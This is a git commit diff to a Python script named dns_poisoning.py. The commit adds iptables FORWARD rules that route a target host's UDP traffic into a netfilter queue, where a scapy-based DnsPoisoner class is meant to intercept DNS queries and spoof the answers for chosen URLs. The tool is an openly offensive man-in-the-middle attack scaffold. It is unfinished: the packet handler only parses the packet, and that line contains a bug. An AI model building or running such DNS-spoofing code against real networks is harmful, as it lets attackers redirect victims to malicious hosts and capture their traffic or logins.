c146c9b3004a498c99454abf22fcdaa74fb46b61
Lars Hollander <larshollander@proton.me>
2024-05-23 10:28:36 +0200

    added iptables rules for dns poisoning

--- dns_poisoning.py
+++ dns_poisoning.py
@@ -1,27 +1,32 @@
 from scapy.all import *
 from netfilterqueue import NetfilterQueue
 import multiprocessing
+import os
 
 class DnsPoisoner(multiprocessing.Process):
 
-    def __init__(self, queue_num):
+    def __init__(self, ip, queue_num):
 
         multiprocessing.Process.__init__(self)
 
         self.urls_to_spoof = {}
         self.queue         = NetfilterQueue()
-        self.queue_num     = queue_num
+        self.iprule_add    = "iptables -I FORWARD -p udp -d {} -j NFQUEUE --queue_num {}".format(ip, queue_num)
+        self.iprule_remove = "iptables -D FORWARD -p udp -d {} -j NFQUEUE --queue_num {}".format(ip, queue_num)
         self.exit          = False
+
+        self.queue.bind(queue_num, self.handle_packet)
 
     def add_url(self, url, ip):
         self.urls_to_spoof[url] = ip
 
     def handle_packet(self, packet):
-        pass
+
+        packet_scapy = IP(packet.get_payload)
 
     def run(self):
 
-        self.queue.bind(self.queue_num, self.handle_packet)
+        os.system(self.iprule_add)
         self.queue.run()
 
         while not self.exit:
@@ -31,4 +36,5 @@ class DnsPoisoner(multiprocessing.Process):
 
     def stop(self):
 
+        os.system(self.iprule_remove)
         self.exit = True
